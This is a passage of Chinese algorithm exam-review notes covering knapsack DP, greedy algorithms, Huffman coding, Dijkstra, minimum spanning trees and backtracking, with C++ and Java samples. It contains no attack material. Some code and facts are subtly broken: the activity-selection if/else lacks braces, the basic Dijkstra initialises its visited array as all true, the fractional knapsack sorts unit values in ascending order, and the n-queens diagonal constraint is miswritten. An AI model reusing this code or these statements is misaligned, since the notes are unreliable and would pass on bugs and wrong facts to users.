1计算而来，本层的dpi并不会被覆盖！\n（如何这里读不懂，大家就要动手试一试了，空想还是不靠谱的，实践出真知！）\n再来看看两个嵌套for循环的顺序，代码中是先遍历物品嵌套遍历背包容量，那可不可以先遍历背包容量嵌套遍历物品呢？\n不可以！\n因为一维dp的写法，背包容量一定是要倒序遍历（原因上面已经讲了），如果遍历背包容量放在上一层，那么每个dp[j]就只会放入一个物品，即：背包里只放入了一个物品。\n所以一维dp数组的背包在遍历顺序上和二维其实是有很大差异的！，这一点大家一定要注意。\n10.最优二叉搜索树 # TODO：\n4.贪心算法 # 由局部最优推理全局最优，但是结果不一定正确，数学上的证明才能说明最好。\n一般来说简单的贪心都会先考虑排序问题。\n1.活动安排问题 # 活动安排问题：要求高效地安排一系列争用某一公共资源的活动。\n活动序号 1 2 3 4 5 6 7 8 9 10 11 起始时间 1 3 0 5 3 5 6 8 8 2 12 结束时间 4 5 6 7 8 9 10 11 12 13 14 1、问题定义 # ​\t设有n个活动的集合E={1,2,…,n}，其中每个活动都要求使用同一资源，如演讲会场等，而在同一时间内只有一个活动能使用这一资源。（临界资源）\n​\t每个活动i都有一个要求使用该资源的起始时间𝑠𝑖和一个结束时间𝑓𝑖，且𝑠𝑖\u0026lt;𝑓𝑖 。\n​\t如果选择了活动i，则它在半开时间区间[𝑠𝑖,𝑓𝑖)内占用资源。若区间与[𝑠𝑖,𝑓𝑖)区间[𝑠𝑗,𝑓𝑗)不相交，则称活动i与活动j是相容的。即，当𝑠𝑖≥𝑓𝑗或𝑠𝑗≥𝑓𝑖时，活动i与活动j相容，\n​\t问题就是选择一个由互相兼容的活动组成的最大集合\n2、实现代码 # template\u0026lt;class Type\u0026gt; void GreedySelector(int n, Type s[], Type f[], bool A[]) { //各活动的起始时间和结束时间存储在数组s和f中 //且按结束时间的非递减排序：f1≤f2≤…≤fn排列。 A[1]=true; //用集合A存储所选择的活动 int j=1; for(int i=2; i\u0026lt;=n; i++) { //将与j相容的具有最早完成时间的相容活动加入集合A if(s[i]\u0026gt;=f[j]) A[i]=true; j=i; else A[i]=false; } } 3、算法分析 # ​\t设集合a包含已被选择的活动， 初始时为空。所有待选择的活动按结束时间的非递减顺序排列：𝑓1≤𝑓2≤\u0026hellip;𝑓𝑛\n​\t变量j指出最近加入a的活动序号。由于按结束时间非递减顺序来考虑各项活动的，所以𝑓𝑗总是a中所有活动的最大结束时间\n​\t由于输入活动是以完成时间的非递减排列，所选择的下一个活动总是可被合法调度的活动中具有最早结束时间的那个，所以算法是一个**“贪心的”选择**，即使得使剩余的可安排时间段极大化，以便安排尽可能多的相容活动。\n4、复杂性分析 # ​\t算法GreedySelector的效率极高。当输入的活动已按结束时间的非减序排列，算法只需O(n)的时间就可安排n个活动，使最多的活动能相容地使用公共资源。 如果所给出的活动未按非减序排列，可以用O(nlogn)的时间重排。\n5、贪心选择性质和最优子结构性质证明 # 还是注意贪心的证明的方法。\n​\t设集合E={1，2，…，n}为所给的活动集合。由于E中活动按结束时间的非减序排列，故活动1有最早完成时间。\n证明I：活动安排问题有一个最优解以贪心选择开始，即该最优解中包含活动1。\n证明II：对集合E中所有与活动1相容的活动进行活动安排求得最优解的子问题。\n​\t即需证明：若A是原问题的最优解，则A’=A-{1}是活动安排问题E’={i∈E:si≥f1}的最优解。\n非常浅显的证明，考试前看一下。\n​\t如果能找到*E*’的一个最优解*B*’，它包含比*A*’更多的活动，则将活动1加入到*B*’中将产生*E*的一个解*B*，它包含比*A*更多的活动。这与*A*的最优性矛盾。\n​\t结论：每一步所做的贪心选择问题都将问题简化为一个更小的与原问题具有相同形式的子问题。\n2.01背包问题 # ​\t与0-1背包问题类似，所不同的是在选择物品i装入背包时，可以选择物品i的一部分，而不一定要全部装入背包。 此问题的形式化描述为，给定𝑐\u0026gt;0,𝑤𝑖\u0026gt;0,𝑣𝑖\u0026gt;0,1≤𝑖≤𝑛，要求找出一个n元0-1向量(𝑥1,𝑥2,..,𝑥𝑛)，其中0≤𝑥𝑖≤1,1≤𝑖≤𝑛 ，使得对𝑤𝑖𝑥𝑖求和小于等于c ，并且对𝑣𝑖𝑥𝑖求和达到最大。\n​\t对于0-1背包问题，贪心选择之所以不能得到最优解是因为，在这种情况下，无法保证最终能把背包装满，部分闲置的背包空间会使每千克背包空间的价值降低。\n1、题目描述 # ​\t有3种物品，背包的容量为50千克。物品1重10千克，价值60元；物品2重20千克，价值100元；物品3重30千克，价值120元。用贪心算法求背包问题。\n2、基本步骤 # ​\t首先计算每种物品单位重量的价值𝑣𝑖/𝑤𝑖；\n还是根据这个单位重量进行一个排序。\n​\t然后，依贪心选择策略，将尽可能多的单位重量价值最高的物品装入背包。\n​\t若将这种物品全部装入背包后，背包内的物品总重量未超过c，则选择单位重量价值次高的物品并尽可能多地装入背包。依此策略一直地进行下去，直到背包装满为止。\n3、贪心策略 # ​\t贪心策略：物品1，6元/千克；物品2，5元/千克；物品3，4元/千克。\n4、算法描述 # ​\t该算法前提：所有物品在集合中按其单位重量的价值从小到大排列。\nvoid Knapsack(int n, float M, float v[], float w[], float x[]) { sort(n, v, w);//按照单位价值从小到大排列 int i; for (i = 1; i \u0026lt;= n; i++) x[i] = 0; float c = M; for (i = 1; i \u0026lt;= n; i++) { if (w[i] \u0026gt; c) break; x[i] = 1; c -= w[i]; } if (i \u0026lt;= n) x[i] = c / w[i];//按比例放 } 算法Knapspack的主要计算时间在于将各种物品按其单位重量的价值从小到大排序，算法的时间复杂度O(nlogn) 。\n3.HaffMan编码 # 7分简答题\n学过数据结构就比较简单。\n​\t哈夫曼编码是广泛地用于数据文件压缩的十分有效的编码方法。其压缩率通常在20%～90%之间。\n​\t哈夫曼编码算法是用字符在文件中出现的频率表来建立一个用0,1串表示各字符的最优表示方式。\n​\t编码目标：给出现频率高的字符较短的编码，出现频率较低的字符以较长的编码，可以大大缩短总码长。\n1、前缀码(考点) # ​\t定义：对每一个字符规定一个0,1串作为其代码，并要求任一字符的代码都不是其他字符代码的前缀。这种编码称为前缀码。\n​\t编码的前缀性质可以使译码方法非常简单。由于任一字符的代码都不是其他字符代码的前缀，从编码文件中不断取出代表某一字符的前缀码，转换为原字符，即可逐个译出文件中的所有字符。\n规定一下，小的数字放在二叉树的左子结点，大的数字放在二叉树的右边子结点，左边是0,右边是1。\na b c d e f 频率 45 13 12 16 9 5 定长码 000 001 010 011 100 101 变长码 0 101 100 111 1101 1100 给定序列：001011101，可以唯一的分解为0，0，101，1101，编译为aabe\n2、问题分 # ​\t译码过程需要方便地取出编码的前缀，因此需要一个表示前缀码的合适的数据结构。\n​\t用二叉树作为前缀编码的数据结构。在表示前缀码的二叉树中，树叶代表给定的字符，并将每个字符的前缀码看作是从树根到代表该字符的树叶的一条道路。代码中每一位的0或1分别作为指示某结点到其左儿子或右儿子的“路标”。\n3、前缀码的二叉树表示 # 4、构造哈夫曼编码(考点) # ​\t哈夫曼算法以自底向上的方式构造表示最优前缀码的二叉树T。\n​\t编码字符集中每一字符c的频率是f(c)。以f为键值的优先队列Q用以在作贪心选择时有效地确定算法当前要合并的两棵具有最小频率的树。一旦两棵具有最小频率的树合并后，产生一棵新的树，其频率为合并的两棵树的频率之和，并将新树插入优先队列Q中，再进行新的合并。\n•由于字符集中有6个字符，优先队列的大小初始为6，总共用5次合并得到最终的编码树T。\n• 每次合并使Q的大小减1，最终得到的树就是最优前缀编码：哈夫曼编码树，每个字符的编码由树T的根到该字符的路径上各边的标号所组成。\n​\t1️⃣ 算法首先用字符集C中每一个字符c的频率f(c)初始化优先队列Q。以f为键值的优先队列Q用在贪心选择时有效地确定算法当前要合并的2棵具有最小频率的树。\n​\t2️⃣ 然后不断地从优先队列Q中取出具有最小频率的两棵树x和y，将它们合并为一棵新树z。z的频率是x和y的频率之和。\n​\t3️⃣ 新树z以x为其左儿子，y为其右儿子（也可以y为其左儿子，x为其右儿子。不同的次序将产生不同的编码方案，但平均码长是相同的）。经过n-1次的合并后，优先队列中只剩下一棵树，即所要求的树T。\n4.Dijkstra算法\u0026mdash;单源最短路径 # ​\t给定带权有向图G=(V,E)，其中每条边的权是非负实数。\n​\t给定V中的一个顶点，称为源。\n​\t现在要计算从源到其他所有各顶点的最短路径长度。这里的路径长度是指路径上各边权之和，这个问题通常称为单源最短路径问题。\n考点：画一个迭代矩阵\n算法基本思想 # ​\tDijkstra算法是求解单源最短路径问题的一个贪心算法。\n​\t基本思想：设置一个顶点集合S ，并不断地作贪心选择来扩充这个集合。一个顶点属于集合 S 当且仅当从源到该顶点的最短路径长度已知。\nDijkstra算法通过分步方法求出最短路径。\n每一步产生一个到达新的目的顶点的最短路径。\n下一步所能达到的目的顶点通过这样的贪心准则选取：在还未产生最短路径的顶点中，选择路径长度最短的目的顶点。\n也就是说， Dijkstra算法按路径长度顺序产生最短路径。\nDijkstra算法的执行 # 1️⃣ 设置一个顶点集合S。一个顶点属于集合 S 当且仅当从源到该顶点的最短路径长度已知。\n2️⃣ 初始时，S中仅含有源。\n3️⃣ 设u是G的某一个顶点，把从源到u且中间只有经过S中顶点的路称为从源到u的特殊路径，并且用数组dist来记录当前每个顶点所对应的最短特殊路径长度。\n4️⃣ Dijkstra算法每次从V-S中取出具有最短特殊路径长度的顶点u，将u添加到 S 中，同时对数组dist作必要的修改。\n5️⃣ 一旦S包含了所有V中顶点，dist就记录了从源到所有其他顶点之间的最短路径长度。\n过程说明 # 已知：带权有向图\nV = { v1, v2, v3, v4, v5 }\nE = { \u0026lt; v1, v2 \u0026gt;, \u0026lt; v1, v4 \u0026gt;, \u0026lt; v1, v5 \u0026gt;, \u0026lt; v2, v3 \u0026gt;, \u0026lt; v3, v5 \u0026gt;, \u0026lt; v4, v3 \u0026gt;, \u0026lt; v4, v5 \u0026gt; }\n设为v1源点，求其到其余顶点的最短路径。\n其中，没有特殊路径的顶点用maxint表示其最短特殊路径长度\n迭代矩阵(考点) # 可能会画这样的图，数据结构让画过。\n迭代 S u dist[2] dist[3] dist[4] dist[5] 初始 {1} - 10 maxint 30 100 1 {1,2} 2 10 60 30 100 2 {1,2,4} 4 10 50 30 90 3 {1,2,4,3} 3 10 50 30 60 4 {1,2,4,3,5} 5 10 50 30 60 ​\t按长度顺序产生最短路径时，下一条最短路径总是由一条已产生的最短路径加上一条边形成。\n没有优化的代码：\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;algorithm\u0026gt; #include \u0026lt;cstdio\u0026gt; #include \u0026lt;cstring\u0026gt; #define N 510 using namespace std; int grid[N][N]; bool isInSet[N]; int minLen[N]; void dij(int n, int m){ memset(minLen, 0x3f, sizeof(minLen)); memset(isInSet, -1, sizeof(isInSet)); minLen[1] = 0; for(int index = 0; index \u0026lt; n; ++index){ int t = -1; //遍历找到距离最小的点 for(int i = 1; i \u0026lt;= n; ++i){ if(!isInSet[i] \u0026amp;\u0026amp; (t == -1 || minLen[i] \u0026lt; minLen[t])) t = i; } isInSet[t] = true; //用t更新到所有其他点的距离 for(int i = 1; i \u0026lt;= n; ++i){ minLen[i] = min(minLen[i], minLen[t] + grid[t][i]); } } int ans = (minLen[n] == 0x3f3f3f3f ? -1 : minLen[n]); printf(\u0026#34;%d\\n\u0026#34;, ans); } int main(void){ int n, m; cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m; memset(grid, 0x3f, sizeof(grid)); for(int index = 0; index \u0026lt; m; ++index){ int x, y, z; cin \u0026gt;\u0026gt; x \u0026gt;\u0026gt; y \u0026gt;\u0026gt; z; grid[x][y] = min(grid[x][y], z);//去重复 } dij(n, m); } 使用堆来做优化：\nconst int N = 100010; // 稀疏图用邻接表来存 int h[N], e[N], ne[N], idx; int w[N]; // 用来存权重 int dist[N]; bool st[N]; // 如果为true说明这个点的最短路径已经确定 int n, m; void add(int x, int y, int c) { // 有重边也不要紧，假设1-\u0026gt;2有权重为2和3的边，再遍历到点1的时候2号点的距离会更新两次放入堆中 // 这样堆中会有很多冗余的点，但是在弹出的时候还是会弹出最小值2+x（x为之前确定的最短路径）， // 并标记st为true，所以下一次弹出3+x会continue不会向下执行。 w[idx] = c; e[idx] = y; ne[idx] = h[x]; h[x] = idx++; } int dijkstra() { memset(dist, 0x3f, sizeof(dist)); dist[1] = 0; priority_queue\u0026lt;PII, vector\u0026lt;PII\u0026gt;, greater\u0026lt;PII\u0026gt;\u0026gt; heap; // 定义一个小根堆 // 这里heap中为什么要存pair呢，首先小根堆是根据距离来排的，所以有一个变量要是距离， // 其次在从堆中拿出来的时候要知道知道这个点是哪个点，不然怎么更新邻接点呢？所以第二个变量要存点。 heap.push({ 0, 1 }); // 这个顺序不能倒，pair排序时是先根据first，再根据second， // 这里显然要根据距离排序 while(heap.size()) { PII k = heap.top(); // 取不在集合S中距离最短的点 heap.pop(); int ver = k.second, distance = k.first; if(st[ver]) continue; st[ver] = true; for(int i = h[ver]; i != -1; i = ne[i]) { int j = e[i]; // i只是个下标，e中在存的是i这个下标对应的点。 if(dist[j] \u0026gt; distance + w[i]) { dist[j] = distance + w[i]; heap.push({ dist[j], j }); } } } if(dist[n] == 0x3f3f3f3f) return -1; else return dist[n]; } 5.最小生成树MST(算法大意要描述) # 1、问题描述 # 设G=(V,E)是无向带权连通图，即一个网络。\nE中每条边(v,w)的权为𝑐[𝑣][𝑤]。如果G的子图G’是一棵包含G的所有顶点的树，则称G’为G的生成树。\n生成树上各边权的总和称为该生成树的耗费。在G的所有生成树中，耗费最小的生成树称为G的最小生成树。\n网络的最小生成树在实际中有广泛应用。\n例如，在设计通信网络时，用图的顶点表示城市，用边(v,w)的权𝑐[𝑣][𝑤]表示建立城市v和城市w之间的通信线路所需的费用，则最小生成树就给出了建立通信网络的最经济的方案。\n2、贪心法求解准则 # 根据最优量度标准，算法的每一步从图中选择一条符合准则的边，共选择n-1条边，构成无向连通图的一棵生成树。\n贪心法求解的关键：该量度标准必须足够好。它应当保证依据此准则选出n-1条边构成原图的一棵生成树，必定是最小代价生成树。\n3、prim算法 # ​\tMST（Minimum Spanning Tree，最小生成树）问题有两种通用的解法，Prim算法就是其中之一，它是从点的方面考虑构建一颗MST，大致思想是：设图G顶点集合为U，首先任意选择图G中的一点作为起始点a，将该点加入集合V，再从集合U-V中找到另一点b使得点b到V中任意一点的权值最小，此时将b点也加入集合V；以此类推，现在的集合V={a，b}，再从集合U-V中找到另一点c使得点c到V中任意一点的权值最小，此时将c点加入集合V，直至所有顶点全部被加入V，此时就构建出了一颗MST。因为有N个顶点，所以该MST就有N-1条边，每一次向集合V中加入一个点，就意味着找到一条MST的边。\n详解请参考https://blog.csdn.net/yeruby/article/details/38615045\n考点：算法思想与生成顺序方法说明\nKruskal算法的贪心准则：按边代价的非减次序考察E中的边，从中选择一条代价最小的边e=(u,v)。这种做法使得算法在构造生成树的过程中，当前子图不一定是连通的。\n算法思想——从点出发\nvoid Prim(int n,Type **c){//c[i][j]为边(i,j)的权值 TE=Ø; U={1}; while(U!=V){ (u,v)=u属于U且v属于V-U的最小权边； TE=TE∪{(u,v)}; U=U∪{v}; } } Prim算法的时间复杂度为𝑂(𝑛2)\n4、Kruskal算法 # 从边的角度出发解决问题。\n详情请看https://www.cnblogs.com/fzl194/p/8723325.html\n算法思想——从边出发\n1️⃣设连通网 N = (V, E )，令最小生成树初始状态为只有 n 个顶点而无边的非连通图 T=(V, { })，每个顶点自成一个连通分量。\n2️⃣在 E 中选取代价最小的边，若该边依附 的顶点落在 T 中相同的连通分量上（即： 不能形成环），则将此边加入到 T 中；否 则，舍去此边，选取下一条代价最小的边。\n3️⃣ 依此类推，直至 T 中所有顶点都在同一 连通分量上为止。\nKruskal算法的时间复杂度为𝑂(𝑛𝑙𝑜𝑔𝑛)\n6.*多机调度问题 # 近似算法，最长的最先开始处理即可。\n1、问题描述 # ​\t多机调度问题要求给出一种作业调度方案，使所给的n个作业在尽可能短的时间内由m台机器加工处理完成。约定，每个作业均可在任何一台机器上加工处理，但未完工前不允许中断处理。作业不能拆分成更小的子作业。\n这个问题是NP完全问题，到目前为止还没有有效的解法。对于这一类问题,用贪心选择策略有时可以设计出较好的近似算法。\n2、算法思想 # ​\t采用最长处理时间作业优先的贪心选择策略可以设计出解多机调度问题的较好的近似算法。 按此策略，当𝑛≤𝑚时，只要将机器i的[0, ti]时间区间分配给作业i即可，算法只需要O(1)时间。 当𝑛\u0026gt;𝑚 时，首先将n个作业依其所需的处理时间从大到小排序。然后依此顺序将作业分配给空闲的处理机。算法所需的计算时间为O(nlogn)。\n3、举例说明 # ​\t设7个独立作业{1,2,3,4,5,6,7}由3台机器M1，M2和M3加工处理。各作业所需的处理时间分别为{2,14,4,16,6,5,3}。按算法greedy产生的作业调度如下图所示，所需的加工时间为17。\n5.回溯算法 # 填空题会有代码填空，大题会手动回溯\n学习要点 # 理解回溯法的深度优先搜索策略。\n掌握用回溯法解题的算法框架\n（1）递归回溯\n（2）迭代回溯\n（3）子集树算法框架\n（4）排列树算法框架\n5.1 回溯法的算法框架 # ​\t回溯法的基本做法是搜索，或是一种组织得井井有条的，能避免不必要搜索的穷举式搜索法。这种方法适用于解一些组合数相当大的问题。\n​\t回溯法在问题的解空间树中，按深度优先策略，从根结点出发搜索解空间树。算法搜索至解空间树的任意一点时，先判断该结点是否包含问题的解。如果肯定不包含，则跳过对该结点为根的子树的搜索，逐层向其祖先结点回溯；否则，进入该子树，继续按深度优先策略搜索。\n1、问题的解空间 # 用回溯法解问题时，应明确定义问题的解空间。\n解空间往往用向量集表示。\n问题的解向量：回溯法希望一个问题的解能够表示成一个n元式(x1,x2,…,xn)的形式。\n显约束：对分量xi的取值限定。\n隐约束：为满足问题的解而对不同分量之间施加的约束。\n解空间：对于问题的一个实例，解向量满足显式约束条件的所有多元组，构成了该实例的一个解空间。\n2、回溯的基本思想 # 扩展结点：一个正在产生儿子的结点称为扩展结点。\n活结点：一个自身已生成但其儿子还没有全部生成的节点称做活结点。\n死结点：一个所有儿子已经产生的结点称做死结点。\n深度优先的问题状态生成法：如果对一个扩展结点R，一旦产生了它的一个儿子C，就把C当做新的扩展结点。在完成对子树C（以C为根的子树）的穷尽搜索之后，将R重新变成扩展结点，继续生成R的下一个儿子（如果存在）。\n所以回溯法中一个节点是可以多次成为一个扩展节点但是分支限界法一个节点最多仅有一次机会。\n宽度优先的问题状态生成法：在一个扩展结点变成死结点之前，它一直是扩展结点。\n回溯法从开始结点（根结点）出发，以深度优先方式搜索整个解空间。\n基本思想\n1️⃣ 针对所给问题，定义问题的解空间；\n2️⃣ 确定易于搜索的解空间结构；\n3️⃣ 以深度优先方式搜索解空间，并在搜索过程中用剪枝函数避免无效搜索\n常用剪枝函数：（这里可能会考察定义）\n用约束函数在扩展结点处剪去不满足约束的子树；\n用限界函数剪去得不到最优解的子树。\n3、递归回溯——背诵 # void Backtrack (int t) //t为递归深度 { if (t\u0026gt;n) Output(x); //记录或输出可靠解x，x为数组 else for (int i=f(n,t); i\u0026lt;=g(n,t); i++) { //f(n,t)表示在当前扩展结点处未搜索过的子树的起始编号 //g(n,t)为终止编号 x[t]=h(i); //h(i)表示当前扩展结点处x[t]的第i个可选值 if (Constraint(t)\u0026amp;\u0026amp;Bound(t)) //剪枝 Backtrack(t+1); } } 回溯法对解空间作深度优先搜索，因此，在一般情况下用递归方法实现回溯法。\n4、迭代回溯——会填空即可 # void IterativeBacktrack (){ int t=1; while (t\u0026gt;0){ if (f(n,t)\u0026lt;=g(n,t)) for (int i=f(n,t); i\u0026lt;=g(n,t); i++){ x[t]=h(i); if (Constraint(t)\u0026amp;\u0026amp;Bound(t)){ if (solution(t)) //判断是否已得到可行解 Output(x); else t++; } } else t--; } } f(n,t)表示在当前扩展结点处未搜索过的子树的起始编号\ng(n,t)为终止编号\nh(i)表示当前扩展结点处x[t]的第i个可选值\n5、子集树和排列树(重点) # ​\t子集树：当所给的问题是从n个元素的集合S中找出满足某种性质的子集时，相应的解空间树称为子集树。时间复杂度𝛺(2𝑛)。算法描述如下：\nLeetCode:https://leetcode.cn/problems/subsets/\nclass Solution { List\u0026lt;Integer\u0026gt; path = new ArrayList(); List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; ans = new ArrayList(); public List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; subsets(int[] nums) { dfs(0, nums); return ans; } private void dfs(int index, int[] nums) { if(index == nums.length){ ans.add(new ArrayList\u0026lt;Integer\u0026gt;(path)); return; } dfs(index + 1, nums); path.add(nums[index]); dfs(index + 1, nums); path.remove(path.size() - 1); } } 类似于伪代码：\n每个代码选和不选。\nvoid Backtrack (int t) { if (t\u0026gt;n) Output(x); else for (int i=0; i\u0026lt;=1; i++) { x[t]=i; if (Constraint(t)\u0026amp;\u0026amp;Bound(t)) Backtrack(t+1); } } ​\t排列树当所给的问题是确定n个元素满足某种性质的排列时，相应的解空间树称为排列树。时间复杂度𝛺(𝑛!)。算法描述如下：\n时间复杂度就是排列的大小Ann = n!。\nLeetCode:https://leetcode.cn/problems/permutations\nclass Solution { List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; ans = new ArrayList(); public List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; permute(int[] nums) { dfs(0, nums); return ans; } private void swap(int i, int j, int[] nums){ int temp = nums[i]; nums[i] = nums[j]; nums[j] = temp; } private void dfs(int index, int[] nums){ if(index == nums.length){ List\u0026lt;Integer\u0026gt; path = Arrays.stream(nums).boxed().collect(Collectors.toList()); ans.add(path); return; } // 重点：在基准之后循环，交换，接着继续递归。 for(int i = index; i \u0026lt; nums.length; ++i){ swap(i, index, nums); dfs(index + 1, nums); swap(i, index, nums); } } } 注意这里的两个swap函数。\nvoid Backtrack (int t) { if (t\u0026gt;n) Output(x); else for (int i=t; i\u0026lt;=n; i++) { Swap(x[t], x[i]); if (Constraint(t)\u0026amp;\u0026amp;Bound(t)) Backtrack(t+1); Swap(x[t], x[i]); } } 5.2 装载问题 # 1、问题描述 # 有一批共n个集装箱要装上2艘载重量分别为c1和c2的轮船，其中集装箱i的重量为wi，且∑𝑖=1𝑛𝑤𝑖≤𝑐1+𝑐2，装载问题要求确定是否有一个合理的装载方案可将这些集装箱装上这2艘轮船。如果有，找出一种装载方案。\n例如：\nn=3, c1=c2=50，且w=[10,40,40]。\n装载方案：\n第一艘轮船装集装箱1和2；二艘轮船装集装箱3。\n如果一个给定装载问题有解，则采用下面的策略可得到最优装载方案。(1)首先将第一艘轮船尽可能装满；(2)将剩余的集装箱装上第二艘轮船。将第一艘轮船尽可能装满等价于选取全体集装箱的一个子集，使该子集中集装箱重量之和最接近c1。\n2、算法分析 # 解空间：子集树\n可行性约束函数(选择当前元素)：∑𝑖=1𝑛𝑤𝑖𝑥𝑖≤𝑐1𝑥𝑖∈0,1\ntemplate\u0026lt;typename Type\u0026gt; class Loading { template\u0026lt;typename T\u0026gt; friend T MaxLoading(T [],T,int); private: void Backtrack(int i); int n; //集装箱数 Type *w; //集装箱重量数组 Type c; //第1艘轮船的载重量 Type cw; //当前载重量 Type bestw; //当前最优载重量 }; template\u0026lt;typename Type\u0026gt; void Loading\u0026lt;Type\u0026gt;::Backtrack(int i) //搜索第i层结点 { if(i\u0026gt;n) //到达叶结点 { if(cw\u0026gt;bestw) bestw=cw; return; } if(cw+w[i]\u0026lt;=c) //进入左子树，x[i]=1 { cw+=w[i]; Backtrack(i+1); //继续搜索下一层 cw-=w[i]; //退出左子树 } Backtrack(i+1); //进入右子树，x[i]=0 } template\u0026lt;typename Type\u0026gt; Type MaxLoading(Type w[],Type c,int n) //返回最优载重量 { Loading\u0026lt;Type\u0026gt; X; X.w=w; //初始化X X.c=c; X.n=n; X.bestw=0; X.cw=0; X.Backtrack(1); //从第1层开始搜索 return X.bestw; } int main() { const int n=6; int c=80; int w[]={0,20,40,40,10,30,20}; //下标从1开始 int s=MaxLoading(w,c,n); cout\u0026lt;\u0026lt;s\u0026lt;\u0026lt;endl; return 0; 算法在每个结点处花费O(1)时间，子集树中结点个数为O(2n)，故算法的计算时间为O(2n)。\n3、上界函数 # 对于上一算法可引入一个上界函数，用于剪去不含最优解的子树。\n上界函数(不选择当前元素)：当前载重量cw+剩余集装箱的重量r≤当前最优载重量bestw。\n就是剪枝函数。\ntemplate\u0026lt;typename Type\u0026gt; class Loading { template\u0026lt;typename T\u0026gt; friend T MaxLoading(T [],T,int); private: void Backtrack(int i); int n; //集装箱数 Type *w; //集装箱重量数组 Type c; //第1艘轮船的载重量 Type cw; //当前载重量 Type bestw; //当前最优载重量 Type r; //剩余集装箱重量 }; template\u0026lt;typename Type\u0026gt; void Loading\u0026lt;Type\u0026gt;::Backtrack(int i) //搜索第i层结点 { if(i\u0026gt;n) //到达叶结点 { if(cw\u0026gt;bestw) bestw=cw; return; } r-=w[i]; //剩余集装箱重量 if(cw+w[i]\u0026lt;=c) //进入左子树，x[i]=1 { cw+=w[i]; Backtrack(i+1); //继续搜索下一层 cw-=w[i]; //退出左子树 } if(cw+r\u0026gt;bestw) //上界函数 //进入右子树，x[i]=0 Backtrack(i+1); r+=w[i]; } 4、构造最优解 # 为构造最优解，需在算法中记录与当前最优值相应的当前最优解。\n在类Loading中增加两个私有数据成员：\nint* x：用于记录从根至当前结点的路径；\nint* bestx：记录当前最优解。\n算法搜索到叶结点处，就修正bestx的值。\npublic class Loading { // 船最大装载问题 private int n;// 集装箱数 private int[] x;// 当前解 private int[] bestx;// 当前最优解 private int[] w;// 集装箱重量数组 private int c;// 第一艘船的载重量 private int cw;// 当前载重量 private int bestw;// 当前最优载重量 private int r;// 剩余集装箱重量 void backTrack(int i)// 搜索第i层结点 { if (i \u0026gt; n) { // 到达叶结点 if (cw \u0026gt; bestw) { for (int j = 1; j \u0026lt;= n; j++) { bestx[j] = x[j]; } bestw = cw; } return; } r -= w[i]; // 剩余集装箱重量 if (cw + w[i] \u0026lt;= c) { // 进入左子树 x[i] = 1; // 装第i个集装箱 cw += w[i]; backTrack(i + 1); // 进入下一层 cw -= w[i]; // 退出左子树 } if (cw + r \u0026gt; bestw) { // 进入右子树 x[i] = 0; // 不装第i个集装箱 backTrack(i + 1); } r += w[i]; } public Loading(int[] w, int c, int n, int[] bestx) { this.w = w; this.c = c; this.n = n; this.bestx = bestx; this.bestw = 0; this.cw = 0; for (int i = 1; i \u0026lt;= n; i++) { this.r += w[i]; } this.x = new int[n + 1]; }// 构造器 public static void main(String[] args) { int n = 5; int c = 10; int w[] = {0, 7, 2, 6, 5, 4};// 下标从1开始 int bestx[] = new int[n + 1]; Loading test = new Loading(w, c, n, bestx); test.backTrack(1); for (int i = 1; i \u0026lt;= n; i++) { System.out.print(bestx[i] + \u0026#34; \u0026#34;); } System.out.println(); System.out.println(test.bestw); return; } } 由于bestx可能被更新O(2n)次，故算法的时间复杂性为O(n2^n)。\n5、迭代回溯(填空即可) # 理解循环遍历的原理。\n由于数组x记录了解空间树中从根到当前扩展结点的路径，利用这些信息，可将上述回溯法表示成非递归的形式。\nn=3, c1=c2=50，且w=[10,40,40]\n//迭代回溯法，返回最优载重量 template\u0026lt;typename Type\u0026gt; Type MaxLoading(Type w[],Type c,int n,int bestx[]) { //初始化根结点 int i=1; int *x=new int[n+1]; Type bestw=0; Type cw=0; Type r=0; for(int j=1;j\u0026lt;=n;j++) r+=w[j]; while(true) //搜索子树 { while(i\u0026lt;=n\u0026amp;\u0026amp;cw+w[i]\u0026lt;=c) //进入左子树，条件为真，则一直往左搜索 { r-=w[i]; cw+=w[i]; x[i]=1; i++; } if(i\u0026gt;n) //到达叶结点 { for(int j=1;j\u0026lt;=n;j++) bestx[j]=x[j]; bestw=cw; } else //进入右子树 { r-=w[i]; x[i]=0; i++; } while(cw+r\u0026lt;=bestw) //剪枝回溯 { i--; while(i\u0026gt;0\u0026amp;\u0026amp;!x[i]) //从右子树返回 { r+=w[i]; i--; } if(i==0) //如返回到根，则结束 { delete[] x; return bestw; } //进入右子树 x[i]=0; cw-=w[i]; i++; } } } 算法的计算时间为O(2^n)。\n5.3 n皇后问题(重点,三个函数都要掌握) # LeetCode:https://leetcode.cn/problems/n-queens/description/\nN皇后本质还是排列的问题。\n详细的解答：https://leetcode.cn/problems/n-queens/solutions/2079586/hui-su-tao-lu-miao-sha-nhuang-hou-shi-pi-mljv/\n1、问题描述 # ​\t在n×n格的棋盘上放置彼此不受攻击的n个皇后。按照国际象棋的规则，皇后可以攻击与之处在同一行或同一列或同一斜线上的棋子。n后问题等价于在n×n格的棋盘上放置n个皇后，任何2个皇后不放在同一行或同一列或同一斜线上。\n2、算法设计 # 解向量：(x1,x2,\u0026hellip;,xn)\n用n元组x[1:n]表示n后问题的解，其中x[i]表示皇后i放在棋盘的第i行的第x[i]列。\n显约束：xi=1,2,\u0026hellip;,n（能取值的范围）\n隐约束：（两个皇后之间不能相互攻击）\n不同列：xi≠xj\n不处于同一正反对角线：|i-j|≠|xi-xj|\n回溯法解n后问题时，用完全n叉树表示解空间，用可行性约束Place()剪去不满足行、列和斜线约束的子树。\nBacktrack(i)搜索解空间中第i层子树。\nsum记录当前已找到的可行方案数。\n3、四皇后问题 # 问题描述\n在4 x 4棋盘上放上4个皇后，使皇后彼此不受攻击。不受攻击的条件是彼此不在同行（列）、斜线上。求出全部的放法。\n解表示\n解向量： 4元向量X=(x1,x2,x3,x4)， xi 表示皇后i放在i行上的列号，如(3,1,2,4)\n解空间：｛(x1,x2,x3,x4)｜xi∈S，i=1~4｝S={1,2,3,4}\n可行性约束函数\n显约束：　xi∈S，i=1~4\n隐约束(i ≠ j)：xi ≠ xj (不在同一列)\n​ |i－xi|≠|j－xj|　